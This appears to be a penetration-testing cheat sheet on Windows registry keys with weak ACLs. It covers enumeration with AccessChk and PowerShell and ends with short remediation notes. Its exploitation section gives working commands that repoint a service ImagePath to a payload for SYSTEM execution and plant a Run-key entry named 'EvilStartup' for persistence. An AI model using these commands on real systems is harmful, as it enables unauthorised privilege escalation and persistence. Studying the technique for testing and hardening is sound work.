# Permissive Registry ACLs

Windows Registry keys often control critical system behavior, including the execution of services, DLL loading, autoruns, and more. If these registry keys have **misconfigured ACLs (Access Control Lists)**, a low-privileged user may modify them to execute arbitrary code, escalate privileges, or establish persistence.
## What Are Permissive ACLs?

Registry ACLs define who can read, write, or take ownership of a registry key. If an unprivileged user has **write or full control** over a key associated with a high-privileged process, this is a serious misconfiguration.
## Common Vulnerable Registry Paths

- **Service paths** (alternative to weak service binary path):

```
HKLM\SYSTEM\CurrentControlSet\Services\<ServiceName>
```

- **Image File Execution Options (IFEO):**
   
```
HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\<binary>.exe
```

- **App Paths:**

```
HKLM\Software\Microsoft\Windows\CurrentVersion\App Paths\<binary>.exe
```

- **Run/RunOnce Autorun Keys:**

```
HKLM\Software\Microsoft\Windows\CurrentVersion\Run
```

- **CLSID Hijacking:**
   
```
HKCR\CLSID\{CLSID}\InprocServer32
```
## Enumeration
### Using AccessChk (Sysinternals)

```cmd
accesschk64.exe -accepteula -uvqk "HKLM\System\CurrentControlSet\Services"
```

You can also recursively scan an entire hive:

```cmd
accesschk64.exe -accepteula -uvqk "HKLM" > reg_acls.txt
```

Look for keys with:

```
RW BUILTIN\Users
RW Everyone
```
### Using PowerShell

```powershell
Get-Acl -Path "HKLM:\System\CurrentControlSet\Services\<ServiceName>" | Format-List
```

You can automate discovery using PowerUp or other post-exploitation tools like:

```powershell
Invoke-AllChecks
```
## Exploitation Example

If you have write access to a service registry key:

### Modify `ImagePath` to point to your payload:

```powershell
Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Services\VulnService" -Name ImagePath -Value "C:\Temp\rev.exe"
```

Then **restart the service**:

```powershell
sc stop VulnService
sc start VulnService
```

Your payload will now run as `SYSTEM`.

## Persistence via Registry Key Hijack

You can also abuse autorun keys or App Paths:

```powershell
Set-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "EvilStartup" -Value "C:\Users\Public\rev.exe"
```
## Remediation (Defense Notes)

- Use `REGACL`, `Sysinternals AccessChk`, or auditing GPOs to regularly verify permissions.    
- Lock down critical keys (especially service keys and autorun entries).
- Enable registry auditing via Group Policy.    
- Never grant `Users` or `Everyone` write access to keys under `HKLM`.
